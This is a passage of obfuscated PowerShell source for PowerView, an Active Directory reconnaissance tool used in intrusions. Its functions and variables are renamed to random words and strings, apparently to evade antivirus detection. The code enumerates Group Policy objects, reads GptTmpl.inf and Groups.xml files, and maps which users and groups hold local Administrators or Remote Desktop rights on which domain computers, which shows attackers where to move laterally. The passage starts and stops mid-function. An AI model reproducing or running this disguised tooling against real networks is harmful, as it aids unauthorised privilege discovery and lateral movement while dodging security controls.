                        $jVwQymgR99.SubString($jVwQymgR99.IndexOf("$($_),"))
                    }
                }
                Write-Verbose "[Tahitians] object OUs: $oynfoMeB99"
                if ($oynfoMeB99) {
                    $qbMTjYnI99.Remove('Properties')
                    $waTZGWKw99 = $False
                    ForEach($WcJCIUlE99 in $oynfoMeB99) {
                        $qbMTjYnI99['Identity'] = $WcJCIUlE99
                        $tZAoPtPN99 += headboards @SearcherArguments | ForEach-Object {
                            if ($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $Parts = $_.split(';')
                                        $GpoDN = $Parts[0]
                                        $HJKAZfUx99 = $Parts[1]
                                        if ($waTZGWKw99) {
                                            if ($HJKAZfUx99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }
                            if ($_.gpoptions -eq 1) {
                                $waTZGWKw99 = $True
                            }
                        }
                    }
                }
                if ($ZTpiMOiS99) {
                    $ikfEfgot99 = (handed -iEYVPYCX99 $ZTpiMOiS99).SiteName
                    if($ikfEfgot99 -and ($ikfEfgot99 -notlike 'Error*')) {
                        $qbMTjYnI99['Identity'] = $ikfEfgot99
                        $tZAoPtPN99 += Javas @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }
                $uWuoEZGI99 = $jVwQymgR99.SubString($jVwQymgR99.IndexOf('DC='))
                $qbMTjYnI99.Remove('Identity')
                $qbMTjYnI99.Remove('Properties')
                $qbMTjYnI99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$uWuoEZGI99)"
                $tZAoPtPN99 += monologue @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Tahitians] GPOAdsPaths: $tZAoPtPN99"
                if ($eNeuTler99) { $qbMTjYnI99['Properties'] = $eNeuTler99 }
                else { $qbMTjYnI99.Remove('Properties') }
                $qbMTjYnI99.Remove('Identity')
                $tZAoPtPN99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $qbMTjYnI99['SearchBase'] = $_
                    $qbMTjYnI99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    monologue @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $UpOHlfOj99 = ''
                $iNUvqNTo99 = ''
                $NADQIykH99 | Where-Object {$_} | ForEach-Object {
                    $xzUuDuRm99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($xzUuDuRm99 -match 'LDAP://|^CN=.*') {
                        $UpOHlfOj99 += "(distinguishedname=$xzUuDuRm99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $oXGljrha99 = $xzUuDuRm99.SubString($xzUuDuRm99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Tahitians] Extracted domain '$oXGljrha99' from '$xzUuDuRm99'"
                            $qbMTjYnI99['Domain'] = $oXGljrha99
                            $iDrQmBWE99 = squintest @SearcherArguments
                            if (-not $iDrQmBWE99) {
                                Write-Warning "[Tahitians] Unable to retrieve domain searcher for '$oXGljrha99'"
                            }
                        }
                    }
                    elseif ($xzUuDuRm99 -match '{.*}') {
                        $UpOHlfOj99 += "(name=$xzUuDuRm99)"
                    }
                    else {
                        try {
                            $PTUZmxXK99 = (-Join (([Guid]$xzUuDuRm99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $UpOHlfOj99 += "(objectguid=$PTUZmxXK99)"
                        }
                        catch {
                            $UpOHlfOj99 += "(displayname=$xzUuDuRm99)"
                        }
                    }
                }
                if ($UpOHlfOj99 -and ($UpOHlfOj99.Trim() -ne '') ) {
                    $iNUvqNTo99 += "(|$UpOHlfOj99)"
                }
                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[Tahitians] Using additional LDAP filter: $aWyQQagT99"
                    $iNUvqNTo99 += "$aWyQQagT99"
                }
                $iDrQmBWE99.filter = "(&(objectCategory=groupPolicyContainer)$iNUvqNTo99)"
                Write-Verbose "[Tahitians] filter string: $($iDrQmBWE99.filter)"
                if ($PSBoundParameters['FindOne']) { $IUnNdChl99 = $iDrQmBWE99.FindOne() }
                else { $IUnNdChl99 = $iDrQmBWE99.FindAll() }
                $IUnNdChl99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($BffxXlHt99 -Match '^GC://')) {
                            $GPO = gelling -IzcJvFdA99 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $OHSZKHpQ99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $wPGTASPv99 = "\\$OHSZKHpQ99\SysVol\$OHSZKHpQ99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $wPGTASPv99
                            }
                            catch {
                                Write-Verbose "[Tahitians] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = gelling -IzcJvFdA99 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($IUnNdChl99) {
                    try { $IUnNdChl99.dispose() }
                    catch {
                        Write-Verbose "[Tahitians] Error disposing of the Results object: $_"
                    }
                }
                $iDrQmBWE99.dispose()
            }
        }
    }
}
function squawk {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $NADQIykH99,
        [Switch]
        $MgQGRNCo99,
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $aWyQQagT99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Domain']) { $qbMTjYnI99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['LDAPFilter']) { $qbMTjYnI99['LDAPFilter'] = $CmuysoGL99 }
        if ($PSBoundParameters['SearchBase']) { $qbMTjYnI99['SearchBase'] = $BffxXlHt99 }
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $qbMTjYnI99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $qbMTjYnI99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $qbMTjYnI99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $tClHnETA99 = @{}
        if ($PSBoundParameters['Domain']) { $tClHnETA99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $tClHnETA99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Credential']) { $tClHnETA99['Credential'] = $QWHERWHL99 }
        $lMsDJrTd99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }
    PROCESS {
        if ($PSBoundParameters['Identity']) { $qbMTjYnI99['Identity'] = $NADQIykH99 }
        Tahitians @SearcherArguments | ForEach-Object {
            $yIBNgIDc99 = $_.displayname
            $fuAImXcd99 = $_.name
            $YzOJJGkA99 = $_.gpcfilesyspath
            $KEoKYJky99 =  @{ 'GptTmplPath' = "$YzOJJGkA99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $KEoKYJky99['Credential'] = $QWHERWHL99 }
            $Inf = Mexicans @ParseArgs
            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $IQHMFXwC99 = @{}
                ForEach ($oobIsdGn99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $NyDHAgkE99 = $oobIsdGn99.Key.Split('__', $lMsDJrTd99) | ForEach-Object {$_.Trim()}
                    $PjVBGnAY99 = $oobIsdGn99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}
                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $jhXNquRd99 = @()
                        ForEach ($IZCGoUsG99 in $PjVBGnAY99) {
                            if ($IZCGoUsG99 -and ($IZCGoUsG99.Trim() -ne '')) {
                                if ($IZCGoUsG99 -notmatch '^S-1-.*') {
                                    $ZRFWPbST99 = @{'ObjectName' = $IZCGoUsG99}
                                    if ($PSBoundParameters['Domain']) { $ZRFWPbST99['Domain'] = $CmuysoGL99 }
                                    $waerGDtb99 = Moroccans @ConvertToArguments
                                    if ($waerGDtb99) {
                                        $jhXNquRd99 += $waerGDtb99
                                    }
                                    else {
                                        $jhXNquRd99 += $IZCGoUsG99
                                    }
                                }
                                else {
                                    $jhXNquRd99 += $IZCGoUsG99
                                }
                            }
                        }
                        $PjVBGnAY99 = $jhXNquRd99
                    }
                    if (-not $IQHMFXwC99[$Group]) {
                        $IQHMFXwC99[$Group] = @{}
                    }
                    if ($PjVBGnAY99 -isnot [System.Array]) {$PjVBGnAY99 = @($PjVBGnAY99)}
                    $IQHMFXwC99[$Group].Add($NyDHAgkE99, $PjVBGnAY99)
                }
                ForEach ($oobIsdGn99 in $IQHMFXwC99.GetEnumerator()) {
                    if ($oobIsdGn99 -and $oobIsdGn99.Key -and ($oobIsdGn99.Key -match '^\*')) {
                        $JqKuNPvR99 = $oobIsdGn99.Key.Trim('*')
                        if ($JqKuNPvR99 -and ($JqKuNPvR99.Trim() -ne '')) {
                            $PnKWBocM99 = vileness -ObjectSID $JqKuNPvR99 @ConvertArguments
                        }
                        else {
                            $PnKWBocM99 = $False
                        }
                    }
                    else {
                        $PnKWBocM99 = $oobIsdGn99.Key
                        if ($PnKWBocM99 -and ($PnKWBocM99.Trim() -ne '')) {
                            if ($PnKWBocM99 -match 'Administrators') {
                                $JqKuNPvR99 = 'S-1-5-32-544'
                            }
                            elseif ($PnKWBocM99 -match 'Remote Desktop') {
                                $JqKuNPvR99 = 'S-1-5-32-555'
                            }
                            elseif ($PnKWBocM99 -match 'Guests') {
                                $JqKuNPvR99 = 'S-1-5-32-546'
                            }
                            elseif ($PnKWBocM99.Trim() -ne '') {
                                $ZRFWPbST99 = @{'ObjectName' = $PnKWBocM99}
                                if ($PSBoundParameters['Domain']) { $ZRFWPbST99['Domain'] = $CmuysoGL99 }
                                $JqKuNPvR99 = Moroccans @ConvertToArguments
                            }
                            else {
                                $JqKuNPvR99 = $Null
                            }
                        }
                    }
                    $DXsRASAk99 = New-Object PSObject
                    $DXsRASAk99 | Add-Member Noteproperty 'GPODisplayName' $yIBNgIDc99
                    $DXsRASAk99 | Add-Member Noteproperty 'GPOName' $fuAImXcd99
                    $DXsRASAk99 | Add-Member Noteproperty 'GPOPath' $YzOJJGkA99
                    $DXsRASAk99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $DXsRASAk99 | Add-Member Noteproperty 'Filters' $Null
                    $DXsRASAk99 | Add-Member Noteproperty 'GroupName' $PnKWBocM99
                    $DXsRASAk99 | Add-Member Noteproperty 'GroupSID' $JqKuNPvR99
                    $DXsRASAk99 | Add-Member Noteproperty 'GroupMemberOf' $oobIsdGn99.Value.Memberof
                    $DXsRASAk99 | Add-Member Noteproperty 'GroupMembers' $oobIsdGn99.Value.Members
                    $DXsRASAk99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $DXsRASAk99
                }
            }
            $KEoKYJky99 =  @{
                'GroupsXMLpath' = "$YzOJJGkA99\MACHINE\Preferences\Groups\Groups.xml"
            }
            Staubach @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $jhXNquRd99 = @()
                    ForEach ($IZCGoUsG99 in $_.GroupMembers) {
                        if ($IZCGoUsG99 -and ($IZCGoUsG99.Trim() -ne '')) {
                            if ($IZCGoUsG99 -notmatch '^S-1-.*') {
                                $ZRFWPbST99 = @{'ObjectName' = $PnKWBocM99}
                                if ($PSBoundParameters['Domain']) { $ZRFWPbST99['Domain'] = $CmuysoGL99 }
                                $waerGDtb99 = Moroccans -CmuysoGL99 $CmuysoGL99 -PEicaWON99 $IZCGoUsG99
                                if ($waerGDtb99) {
                                    $jhXNquRd99 += $waerGDtb99
                                }
                                else {
                                    $jhXNquRd99 += $IZCGoUsG99
                                }
                            }
                            else {
                                $jhXNquRd99 += $IZCGoUsG99
                            }
                        }
                    }
                    $_.GroupMembers = $jhXNquRd99
                }
                $_ | Add-Member Noteproperty 'GPODisplayName' $yIBNgIDc99
                $_ | Add-Member Noteproperty 'GPOName' $fuAImXcd99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}
function disconnected {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $NADQIykH99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $TVYfdCKC99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $wTkxXPvY99 = @{}
        if ($PSBoundParameters['Domain']) { $wTkxXPvY99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $wTkxXPvY99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wTkxXPvY99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wTkxXPvY99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wTkxXPvY99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wTkxXPvY99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wTkxXPvY99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        $KXJLWfZS99 = @()
        if ($PSBoundParameters['Identity']) {
            $KXJLWfZS99 += monologue @CommonArguments -NADQIykH99 $NADQIykH99 | Select-Object -Expand objectsid
            $jSwjDHZq99 = $KXJLWfZS99
            if (-not $KXJLWfZS99) {
                Throw "[disconnected] Unable to retrieve SID for identity '$NADQIykH99'"
            }
        }
        else {
            $KXJLWfZS99 = @('*')
        }
        if ($TVYfdCKC99 -match 'S-1-5') {
            $GbaSYISP99 = $TVYfdCKC99
        }
        elseif ($TVYfdCKC99 -match 'Admin') {
            $GbaSYISP99 = 'S-1-5-32-544'
        }
        else {
            $GbaSYISP99 = 'S-1-5-32-555'
        }
        if ($KXJLWfZS99[0] -ne '*') {
            ForEach ($vwZZtFNK99 in $KXJLWfZS99) {
                Write-Verbose "[disconnected] Enumerating nested group memberships for: '$vwZZtFNK99'"
                $KXJLWfZS99 += highfalutin @CommonArguments -IzcJvFdA99 'objectsid' -bhQvJAVG99 $vwZZtFNK99 | Select-Object -ExpandProperty objectsid
            }
        }
        Write-Verbose "[disconnected] Target localgroup SID: $GbaSYISP99"
        Write-Verbose "[disconnected] Effective target domain SIDs: $KXJLWfZS99"
        $gyqMJjFO99 = squawk @CommonArguments -MgQGRNCo99 | ForEach-Object {
            $DXsRASAk99 = $_
            if ($DXsRASAk99.GroupSID -match $GbaSYISP99) {
                $DXsRASAk99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($KXJLWfZS99[0] -eq '*') -or ($KXJLWfZS99 -Contains $_) ) {
                        $DXsRASAk99
                    }
                }
            }
            if ( ($DXsRASAk99.GroupMemberOf -contains $GbaSYISP99) ) {
                if ( ($KXJLWfZS99[0] -eq '*') -or ($KXJLWfZS99 -Contains $DXsRASAk99.GroupSID) ) {
                    $DXsRASAk99
                }
            }
        } | Sort-Object -Property GPOName -Unique
        $gyqMJjFO99 | Where-Object {$_} | ForEach-Object {
            $fuAImXcd99 = $_.GPODisplayName
            $RowEJGIY99 = $_.GPOName
            $YzOJJGkA99 = $_.GPOPath
            $VRySlEWL99 = $_.GPOType
            if ($_.GroupMembers) {
                $AOfBLKPQ99 = $_.GroupMembers
            }
            else {
                $AOfBLKPQ99 = $_.GroupSID
            }
            $HXpClEIb99 = $_.Filters
            if ($KXJLWfZS99[0] -eq '*') {
                $WyjpXVVd99 = $AOfBLKPQ99
            }
            else {
                $WyjpXVVd99 = $jSwjDHZq99
            }
            headboards @CommonArguments -Raw -IzcJvFdA99 'name,distinguishedname' -NJskkmCv99 $RowEJGIY99 | ForEach-Object {
                if ($HXpClEIb99) {
                    $uEhenqdG99 = beefsteaks @CommonArguments -IzcJvFdA99 'dnshostname,distinguishedname' -BffxXlHt99 $_.Path | Where-Object {$_.distinguishedname -match ($HXpClEIb99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $uEhenqdG99 = beefsteaks @CommonArguments -IzcJvFdA99 'dnshostname' -BffxXlHt99 $_.Path | Select-Object -ExpandProperty dnshostname
                }
                if ($uEhenqdG99) {
                    if ($uEhenqdG99 -isnot [System.Array]) {$uEhenqdG99 = @($uEhenqdG99)}
                    ForEach ($vwZZtFNK99 in $WyjpXVVd99) {
                        $Object = monologue @CommonArguments -NADQIykH99 $vwZZtFNK99 -IzcJvFdA99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                        $LkYmlAeK99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $AgFglZLI99 = New-Object PSObject
                        $AgFglZLI99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $AgFglZLI99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $AgFglZLI99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $AgFglZLI99 | Add-Member Noteproperty 'Domain' $CmuysoGL99
                        $AgFglZLI99 | Add-Member Noteproperty 'IsGroup' $LkYmlAeK99
                        $AgFglZLI99 | Add-Member Noteproperty 'GPODisplayName' $fuAImXcd99
                        $AgFglZLI99 | Add-Member Noteproperty 'GPOGuid' $RowEJGIY99
                        $AgFglZLI99 | Add-Member Noteproperty 'GPOPath' $YzOJJGkA99
                        $AgFglZLI99 | Add-Member Noteproperty 'GPOType' $VRySlEWL99
                        $AgFglZLI99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $AgFglZLI99 | Add-Member Noteproperty 'ComputerName' $uEhenqdG99
                        $AgFglZLI99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $AgFglZLI99
                    }
                }
            }
            Javas @CommonArguments -IzcJvFdA99 'siteobjectbl,distinguishedname' -NJskkmCv99 $RowEJGIY99 | ForEach-Object {
                ForEach ($vwZZtFNK99 in $WyjpXVVd99) {
                    $Object = monologue @CommonArguments -NADQIykH99 $vwZZtFNK99 -IzcJvFdA99 'samaccounttype,samaccountname,distinguishedname,objectsid'
                    $LkYmlAeK99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                    $AgFglZLI99 = New-Object PSObject
                    $AgFglZLI99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $AgFglZLI99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $AgFglZLI99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $AgFglZLI99 | Add-Member Noteproperty 'IsGroup' $LkYmlAeK99
                    $AgFglZLI99 | Add-Member Noteproperty 'Domain' $CmuysoGL99
                    $AgFglZLI99 | Add-Member Noteproperty 'GPODisplayName' $fuAImXcd99
                    $AgFglZLI99 | Add-Member Noteproperty 'GPOGuid' $RowEJGIY99
                    $AgFglZLI99 | Add-Member Noteproperty 'GPOPath' $YzOJJGkA99
                    $AgFglZLI99 | Add-Member Noteproperty 'GPOType' $VRySlEWL99
                    $AgFglZLI99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $AgFglZLI99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $AgFglZLI99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $AgFglZLI99
                }
            }
        }
    }
}
function coat {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $MNRvXHGj99,
        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $kZHbDuZh99,
        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $TVYfdCKC99 = 'Administrators',
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $BffxXlHt99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $RVZhWaEH99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $rguZwVJP99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Switch]
        $iqiYBoee99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $wTkxXPvY99 = @{}
        if ($PSBoundParameters['Domain']) { $wTkxXPvY99['Domain'] = $CmuysoGL99 }
        if ($PSBoundParameters['Server']) { $wTkxXPvY99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['SearchScope']) { $wTkxXPvY99['SearchScope'] = $RVZhWaEH99 }
        if ($PSBoundParameters['ResultPageSize']) { $wTkxXPvY99['ResultPageSize'] = $rguZwVJP99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $wTkxXPvY99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Tombstone']) { $wTkxXPvY99['Tombstone'] = $iqiYBoee99 }
        if ($PSBoundParameters['Credential']) { $wTkxXPvY99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $MzUEFCMY99 = beefsteaks @CommonArguments -NADQIykH99 $MNRvXHGj99 -IzcJvFdA99 'distinguishedname,dnshostname'
            if (-not $MzUEFCMY99) {
                throw "[coat] Computer $MNRvXHGj99 not found. Try a fully qualified host name."
            }
            ForEach ($UEyZXQpH99 in $MzUEFCMY99) {
                $mSmJHUBk99 = @()
                $DN = $UEyZXQpH99.distinguishedname
                $xsLExexn99 = $DN.IndexOf('OU=')
                if ($xsLExexn99 -gt 0) {
                    $UkRyGZzU99 = $DN.SubString($xsLExexn99)
                }
                if ($UkRyGZzU99) {
                    $mSmJHUBk99 += headboards @CommonArguments -BffxXlHt99 $UkRyGZzU99 -aWyQQagT99 '(gplink=*)' | ForEach-Object {
                        Select-String -ZdbBtSMI99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                Write-Verbose "Enumerating the sitename for: $($UEyZXQpH99.dnshostname)"
                $ikfEfgot99 = (handed -iEYVPYCX99 $UEyZXQpH99.dnshostname).SiteName
                if ($ikfEfgot99 -and ($ikfEfgot99 -notmatch 'Error')) {
                    $mSmJHUBk99 += Javas @CommonArguments -NADQIykH99 $ikfEfgot99 -aWyQQagT99 '(gplink=*)' | ForEach-Object {
                        Select-String -ZdbBtSMI99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }
                $mSmJHUBk99 | squawk @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $DXsRASAk99 = $_
                    if($DXsRASAk99.GroupMembers) {
                        $AOfBLKPQ99 = $DXsRASAk99.GroupMembers
                    }
                    else {
                        $AOfBLKPQ99 = $DXsRASAk99.GroupSID
                    }
                    $AOfBLKPQ99 | ForEach-Object {
                        $Object = monologue @CommonArguments -NADQIykH99 $_
                        $LkYmlAeK99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype
                        $DDIcGQnN99 = New-Object PSObject
                        $DDIcGQnN99 | Add-Member Noteproperty 'ComputerName' $UEyZXQpH99.dnshostname
                        $DDIcGQnN99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $DDIcGQnN99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $DDIcGQnN99 | Add-Member Noteproperty 'ObjectSID' $_
                        $DDIcGQnN99 | Add-Member Noteproperty 'IsGroup' $LkYmlAeK99
                        $DDIcGQnN99 | Add-Member Noteproperty 'GPODisplayName' $DXsRASAk99.GPODisplayName
                        $DDIcGQnN99 | Add-Member Noteproperty 'GPOGuid' $DXsRASAk99.GPOName
                        $DDIcGQnN99 | Add-Member Noteproperty 'GPOPath' $DXsRASAk99.GPOPath
                        $DDIcGQnN99 | Add-Member Noteproperty 'GPOType' $DXsRASAk99.GPOType
                        $DDIcGQnN99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $DDIcGQnN99
                    }
                }
            }
        }
    }
}
function rationalists {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $ytspMbGK99 = 'Domain',
        [ValidateNotNullOrEmpty()]
        [String]
        $CmuysoGL99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $vbyFupaI99,
        [ValidateRange(1, 10000)]
        [Int]
        $CRJCwXfg99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $QWHERWHL99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $qbMTjYnI99 = @{}
        if ($PSBoundParameters['Server']) { $qbMTjYnI99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $qbMTjYnI99['ServerTimeLimit'] = $CRJCwXfg99 }
        if ($PSBoundParameters['Credential']) { $qbMTjYnI99['Credential'] = $QWHERWHL99 }
        $tClHnETA99 = @{}
        if ($PSBoundParameters['Server']) { $tClHnETA99['Server'] = $vbyFupaI99 }
        if ($PSBoundParameters['Credential']) { $tClHnETA99['Credential'] = $QWHERWHL99 }
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $qbMTjYnI99['Domain'] = $CmuysoGL99
            $tClHnETA99['Domain'] = $CmuysoGL99
        }
        if ($ytspMbGK99 -eq 'All') {
